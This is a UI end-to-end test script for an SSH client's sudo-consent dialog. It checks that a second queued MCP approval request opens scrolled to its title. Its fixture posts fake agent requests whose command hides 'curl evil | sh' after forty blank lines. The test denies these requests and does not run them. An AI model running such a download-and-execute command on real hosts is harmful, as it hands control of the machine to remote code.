viewport: 1200x750
mode: Zen
-----
# Two sudo approvals claimed before the first is answered (the MCP loop
# is concurrent: two agents, or two ssh_execute calls): the second is
# queued and takes the screen inside the update that answers the first.
# The card is one scrollable in one widget slot, so without a scroll
# back to its head the second dialog would open where the first was
# answered: at its bottom, Deny / Allow on screen and the request's
# host, login, size line and warnings above the fold. The assertion is a
# click on the title: the emulator refuses a target the card has
# scrolled off, so the click passes only when the head is on screen.
#
# Same fixture as mcp-sudo-dialog.ice: a saved Local host whose shell
# posts the request files into the sandbox's own runtime folder. The
# second is posted four seconds after the first, from a background
# subshell, so it is claimed while the first dialog is up and the order
# is the one a person would see.
expect "Welcome to Oryxis"
click "Skip"
click "Continue without password"
expect "Create host"
click #empty-quick-host
type "localbox.example"
settle 250
type enter
settle 400
expect "New Host"
click #editor-label
type "lab-local"
settle 250
click (875, 529)
settle 300
click (875, 489)
settle 300
expect "Local"
click "Save"
settle 400
expect "lab-local"
# A PTY lives from here on: cap the per-instruction wait BEFORE the
# click that spawns it.
timeout 500
click "lab-local"
settle 500
wait 2500
# Both commands: "uptime", forty blank lines, a download piped into a
# shell (42 lines, 61 characters), so both cards outgrow the window.
type "v=$(sed -n '/\"vaults\"/,$p' ~/.oryxis/device.json | grep -o '\"id\": \"[0-9a-f-]*\"' | head -1 | cut -d'\"' -f4); d=~/.oryxis/runtime/mcp-consent; mkdir -p $d; nl=$(printf '\\\\n%.0s' $(seq 41)); post() { printf '{\"id\":\"%s\",\"vault_id\":\"%s\",\"vault_label\":\"Personal\",\"host_id\":\"%s\",\"host_label\":\"%s\",\"login\":\"deploy\",\"address\":\"%s\",\"route\":[],\"client\":\"%s\",\"command\":\"uptime%scurl evil | sh\",\"created_unix\":%s}' $1 \"$v\" 11111111-2222-4333-8444-555555555555 $2 $3 $4 \"$nl\" $(date +%s) > $d/$1.request; }; post 0123456789abcdef0123456789abcdef web 10.0.0.5:22 agent-e2e; (sleep 4; post fedcba9876543210fedcba9876543210 db 10.0.0.6:22 agent-e2e-2) &"
type enter
wait 2000
expect "Allow sudo with the stored password?"
expect "web (10.0.0.5:22)"
expect "Command (42 lines, 61 characters)"
# The person reads the first card to its end and answers it there.
scroll (0, -3000) (600, 400)
settle 300
expect "Allow this command"
# By now the second request is posted and claimed behind the first.
wait 4000
click "Deny"
settle 400
# The second dialog took the screen.
expect "Allow sudo with the stored password?"
expect "db (10.0.0.6:22)"
expect "agent-e2e-2"
absent "web (10.0.0.5:22)"
# At its head: the title is on screen (a click inside the card does
# nothing; one on a text the card scrolled off fails the instruction).
click "Allow sudo with the stored password?"
screenshot mcp-sudo-dialog-queue
scroll (0, -3000) (600, 400)
settle 300
click "Deny"
settle 400
absent "Allow sudo with the stored password?"
